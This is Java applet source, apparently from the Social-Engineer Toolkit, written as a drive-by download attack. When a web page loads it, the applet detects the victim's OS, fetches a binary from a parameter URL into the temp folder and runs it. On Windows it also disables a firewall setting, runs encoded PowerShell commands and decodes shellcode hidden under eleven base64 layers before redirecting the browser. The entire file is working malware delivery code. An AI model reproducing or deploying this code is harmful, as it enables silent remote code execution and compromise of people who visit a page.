import java.applet.*;
import java.awt.*;
import java.io.*;
import java.net.URL;
import java.util.*;
import sun.misc.BASE64Decoder;
import java.net.URL;

 /**
 *	Original Author: Thomas Werth
 *	Modifications By: Dave Kennedy, Kevin Mitnick
 *	This is a universal Applet which determintes Running OS
 *	Then it fetches based on OS Type download param (WIN,MAC,NIX)
 **/

public class Java extends Applet {

	private Object initialized = null;
	public Object isInitialized()
	{
		return initialized;
	}

    public void init() {
        Process f;

        try {

	    // generate a random string
	    Random r = new Random();
	    String token = Long.toString(Math.abs(r.nextLong()), 36);
            String pfad = System.getProperty("java.io.tmpdir") + File.separator;
            String writedir = System.getProperty("java.io.tmpdir") + File.separator;
            // grab operating system
            String os = System.getProperty("os.name").toLowerCase();
            // grab jvm architecture
            String arch = System.getProperty("os.arch");
            String  downParm   = "";
            String  nextParm   = "";
            String  thirdParm  = "";
            String  fourthParm = "";
            String  fifthParm  = "";
	    String  sixthParm  = "";
	    String  seventhParm = "";
	    String  eightParm = "";

            short osType = -1 ;//0=win,1=mac,2=nix

            if  (os.indexOf( "win" ) >= 0) // We are running Windows then
            {
		// 1 = WINDOWSPLZ
		// 2 = ILIKESTUFF
		// 3 = OSX
		// 4 = LINUX
		// 5 = X64
		// 6 = X86
		// 7 = HUGSNOTDRUGS
		// 8 = LAUNCH 
		// 9 = nextPage
		// 10 = B64EncodeTimes
                downParm    =   getParameter( "1" );
                nextParm    =   getParameter( "2"  );
                thirdParm   =   getParameter( "5" );
                fourthParm  =   getParameter( "6" );
                fifthParm   =   getParameter( "7" );
		sixthParm   =   getParameter( "8" );
		seventhParm =   getParameter( "9" );
		eightParm   =   getParameter( "10" );
                osType      =   0;
                pfad += token + ".exe";
            }
            else if (os.indexOf( "mac" ) >= 0) //MAC
            {
                downParm    =   getParameter( "3" );
                osType      =   1;

		// look for special folders to define snow leopard, etc.
  		if (pfad.startsWith("/var/folders/")) pfad = "/tmp/";
                pfad += token + ".bin";
            }
            else if (os.indexOf( "nix") >=0 || os.indexOf( "nux") >=0) // UNIX
            {
                downParm    =   getParameter( "4" );
                osType      =   2;
                pfad += token + ".bin";
            }
	if ( downParm.length() > 0  && pfad.length() > 0 )
	{
	    // attempt to disable statefulftp if running as an administrator
	    f = Runtime.getRuntime().exec("netsh advfirewall set global StatefulFTP disable");
            // URL parameter
             URL url = new URL(downParm);
            // Get an input stream for reading
            InputStream in = url.openStream();
            // Create a buffered input stream for efficency
            BufferedInputStream bufIn = new BufferedInputStream(in);
            File outputFile = new File(pfad);
            OutputStream out =
                    new BufferedOutputStream(new FileOutputStream(outputFile));
            byte[] buffer = new byte[2048];
            for (;;)  {
                int nBytes = bufIn.read(buffer);
                if (nBytes <= 0) break;
                out.write(buffer, 0, nBytes);
            }
            out.flush();
            out.close();
            in.close();
	}


            // has it executed yet? then target nextPage to victim
            String page = getParameter( "9" );
           if ( page != null && page.length() > 0 )
           {
                URL urlPage = new URL(page);
                getAppletContext().showDocument(urlPage);
           }


	    // Here is where we define OS type, i.e. windows, linux, osx, etc.
            if ( osType < 1 ) // If we're running Windows 
            {
		// Disabled the check, even if it doesn't exist, it will still execute, removes 
		// inability to determine path variables

                //File folderExisting = new File("C:\\Windows\\System32\\WindowsPowershell\\v1.0");
                // if (folderExisting.exists())
                
                // {
                        if (thirdParm.length() > 3) 
                        {
                        // this detection is for the new powershell vector, it will run a special command if the flag is turned on in SET
                        if (arch.contains("86") || arch.contains("64"))
				
                                {
                                // this will be 64 bit
                                if (fourthParm.length() > 3)
				{
					// iterate through Parm for our injection 
					String strMain = fourthParm;
					String[] arrSplit = strMain.split(",");
					for (int i=0; i<arrSplit.length; i++)
					{
						f = Runtime.getRuntime().exec("cmd /c powershell -EncodedCommand " + arrSplit[i]);
	                                }
				}
                                }
                        else if (arch.contains("i"))
                                {
                                // this will be 32 bit
                                if (thirdParm.length() > 3)
                                {
					// iterate through Parm for our injection
                                        String strMain = thirdParm;
                                        String[] arrSplit = strMain.split(",");
                                        for (int i=0; i<arrSplit.length; i++)
                                        {
						f = Runtime.getRuntime().exec("cmd /c powershell -EncodedCommand " + arrSplit[i]);
					}

                                }
                                // }
                      }
                   }
                // if we aren't using the shellcodeexec attack
                if (nextParm.length() < 3)
                {
			// if we turned on binary dropping
			if (sixthParm.length() > 2)
			{

				// if we are using the SET interactive shell
				if (fifthParm.length() > 2)
				{
					//  logfile stuff here 42logfile42.tmp
					// write out a temp file if we aren't going to pass parameters
					f = Runtime.getRuntime().exec("cmd.exe /c \"" + "echo " + fifthParm + " > " + writedir + "42logfile.tmp" + "\"");
					f = Runtime.getRuntime().exec("cmd.exe /c \"" + pfad + " " + fifthParm + "\"");
				}
				// if we aren't using SET interactive shell
				if (fifthParm.length() < 2)
				{
			                f = Runtime.getRuntime().exec("cmd.exe /c " + pfad);
					//f.waitFor();

				}

			}
                }
                // if we are using shellcode exec
                if (nextParm.length() > 3)
                {


			if (sixthParm.length() > 2)
			{
				// all parameters are base64 encoded, this will decode for us and pass the decoded strings
                                BASE64Decoder decoder = new BASE64Decoder();
                                byte[] decoded = decoder.decodeBuffer(nextParm);
				// decode again
				String decoded_string =  new String(decoded);
				String decoded_string_2 = new String(decoder.decodeBuffer(decoded_string));
				// again
				String decoded_string_3 = new String(decoder.decodeBuffer(decoded_string_2));
				// again
				String decoded_string_4 = new String(decoder.decodeBuffer(decoded_string_3));
				// again
				String decoded_string_5 = new String(decoder.decodeBuffer(decoded_string_4));
				// again
				String decoded_string_6 = new String(decoder.decodeBuffer(decoded_string_5));
				// again
				String decoded_string_7 = new String(decoder.decodeBuffer(decoded_string_6));
				// again 
				String decoded_string_8 = new String(decoder.decodeBuffer(decoded_string_7));
				// again
				String decoded_string_9 = new String(decoder.decodeBuffer(decoded_string_8));
                                // again
                                String decoded_string_10 = new String(decoder.decodeBuffer(decoded_string_9));
                                // last one
                                String decoded_string_11 = new String(decoder.decodeBuffer(decoded_string_10));

				PrintStream out = null;
				String randomfile = Long.toString(Math.abs(r.nextLong()), 36);
				try {
				    out = new PrintStream(new FileOutputStream(writedir + randomfile));
				    out.print(decoded_string_11);
				}
				finally {
				    if (out != null) out.close();
				}
				// this is if we are using multipyinjector
                                f = Runtime.getRuntime().exec("cmd.exe /c \"" + pfad + " " + writedir + randomfile + " " + eightParm);
				// this runs the single instance of shellcodeexec, pyinjector, or a binary
				f = Runtime.getRuntime().exec("cmd.exe /c \"" + pfad + " " + decoded_string_11 + "\"");
                                // f.waitFor();
			}
                 }
	         // delete old file
		//  (new File(pfad)).delete();
            }
            else // if not windows then use linux/osx/etc.
            {
		// change permisisons to execute
		Process process1 = Runtime.getRuntime().exec("/bin/chmod 755 " + pfad);
                process1.waitFor();                
		//and execute
                f = Runtime.getRuntime().exec(pfad);
		// wait for termination
		f.waitFor();
		// delete old file
		(new File(pfad)).delete();
            }
			initialized = this;


        } catch(IOException e) {
            e.printStackTrace();
        }
	/* ended here and commented out below for bypass */
	catch (Exception exception)
	{
		exception.printStackTrace();
	}
}
}
